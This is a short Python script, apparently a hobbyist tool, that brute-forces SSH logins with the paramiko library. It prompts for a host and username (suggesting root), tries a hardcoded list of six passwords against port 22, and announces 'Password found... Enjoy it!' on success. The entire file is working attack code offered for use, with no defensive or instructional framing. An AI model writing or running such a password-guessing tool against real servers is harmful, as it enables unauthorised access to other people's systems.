#this module let us use SSH
import paramiko
host = raw_input("Host: ")
username = raw_input("Username:(root maybe?) ")
#this is the array of passwords, you can make it bigger or smaller
password = ["password", "14052002", "asdfghjkl;", "zxcvbnm", "123456789", "12062016"]
#stetics
line = "---------------------------------------------------"
# \n is the same as <br> on html or js :-)
#conection variable
def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code = 1
	ssh.close()
	return code
#os.system("clear")
for i in password:
	try:
		code = ssh_connect(i)
		if code == 0:
			print("\n")
			print(line + "\n Password found: " + i +" you got it! Enjoy it!"+ "\n" + line)
			break
		elif code == 1:

			print("[*] The password " + i + " is not correct!")
	except:
		pass 
